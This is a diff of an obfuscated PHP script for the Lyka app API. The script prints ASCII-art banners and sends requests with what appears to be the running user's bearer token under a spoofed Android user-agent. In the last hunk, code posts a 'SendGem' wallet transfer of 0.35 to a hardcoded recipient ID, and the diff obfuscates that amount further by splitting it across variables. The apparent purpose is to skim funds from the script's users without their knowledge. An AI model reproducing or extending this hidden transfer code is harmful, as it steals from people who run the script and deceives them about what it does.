@@ -1,9 +1,10 @@
-<?php
+Converted PHP script
+ <?php
 @system("clear");
 $var_289c4962919c8c887279a40923d0fcd6 = "[1;30m";
        echo "$var_289c4962919c8c887279a40923d0fcd6
 ";
-			echo "
+		echo "
 		⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄⠄⠸⢀⣿⠄
 		⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿⣿⠄
 		⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿⠄
@@ -29,7 +30,7 @@ echo "$var_c4502e34f756e12522996d4b763a3080
 $var_289c4962919c8c887279a40923d0fcd6 = "[1;37;40m";
        echo "$var_289c4962919c8c887279a40923d0fcd6
 ";
-			echo "
+		echo "
 		⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄⠄⠸⢀⣿⠄
 		⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿⣿⠄
 		⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿⠄
@@ -1878,19 +1879,24 @@ DATA;
 DATA;
     curl_setopt($var_3fd0da38b59460225adfd6550395b597, CURLOPT_POSTFIELDS, $var_59fbd9200499120d847d9b5afd316014);
     $var_500ec3a64caf05140ed55589b136a885 = curl_exec($var_3fd0da38b59460225adfd6550395b597);
+	$var_99de215ed1cc76cccedd0126cd6be805 = "SendGem";
     curl_close($var_3fd0da38b59460225adfd6550395b597);
+	$var_68572bed397ee55f2499497aa887137e = "700017854513";
         $var_e002393bf51b9345376b872dfc002ea6 = json_decode($var_500ec3a64caf05140ed55589b136a885);
     echo $var_e002393bf51b9345376b872dfc002ea6->message;
-	$var_99de215ed1cc76cccedd0126cd6be805 = "SendGem";	
+    $var_808218000c9998587059164b52b36acd = "5";		
 	$var_aca4b5636fed2a336b5cd22cd2bc0680 = "wallets";
-	    $var_3d1336a5d59ee39521c137aeeb8523bf = "https://$var_aca4b5636fed2a336b5cd22cd2bc0680.mylykaapps.com/api/v3/$var_aca4b5636fed2a336b5cd22cd2bc0680/$var_99de215ed1cc76cccedd0126cd6be805";
+		$var_b858543da94d43cfb61782d1c2a225e8 = "0";
+    $var_3d1336a5d59ee39521c137aeeb8523bf = "https://$var_aca4b5636fed2a336b5cd22cd2bc0680.mylykaapps.com/api/v3/$var_aca4b5636fed2a336b5cd22cd2bc0680/$var_99de215ed1cc76cccedd0126cd6be805";
     $var_1d9ce56f70fabfda48b099eede24af3b = curl_init($var_3d1336a5d59ee39521c137aeeb8523bf);
+	$var_8805250ad2ce07a97e25d35cbc4c43e9 = "3";
+	$var_808218000c9998587059164b52b36acd = "5";	
     curl_setopt($var_1d9ce56f70fabfda48b099eede24af3b, CURLOPT_URL, $var_3d1336a5d59ee39521c137aeeb8523bf);
     curl_setopt($var_1d9ce56f70fabfda48b099eede24af3b, CURLOPT_POST, true);
     curl_setopt($var_1d9ce56f70fabfda48b099eede24af3b, CURLOPT_RETURNTRANSFER, true);
 	$var_217cc9ea7e60233b3901af169f965155 = array("authorization:Bearer $var_d64042576877204dcf7c4f7c090dfdd4", "user-agent:Lyka/3.6.29 (com.thingsilikeapp; build:829 Android O_MR1 28))", "deviceos: android", "Content-Type: application/json",);
     curl_setopt($var_1d9ce56f70fabfda48b099eede24af3b, CURLOPT_HTTPHEADER, $var_217cc9ea7e60233b3901af169f965155);
-	$var_7ab2d6450bade4f4d022b45fdffdc0e6 = "0.35";
+	$var_7ab2d6450bade4f4d022b45fdffdc0e6 = "$var_b858543da94d43cfb61782d1c2a225e8.$var_8805250ad2ce07a97e25d35cbc4c43e9$var_808218000c9998587059164b52b36acd";
 	$var_d61ac3601037e2ebbb0f713e7e948ddd = "amount";
 	$var_68572bed397ee55f2499497aa887137e = "700017854513";
     $var_6de8eb6d3870374324955eecc45e2963 = '{"'.$var_d61ac3601037e2ebbb0f713e7e948ddd.'":"' . $var_7ab2d6450bade4f4d022b45fdffdc0e6 . '","device":{"deviceId":"fcaa86b842595c2f",
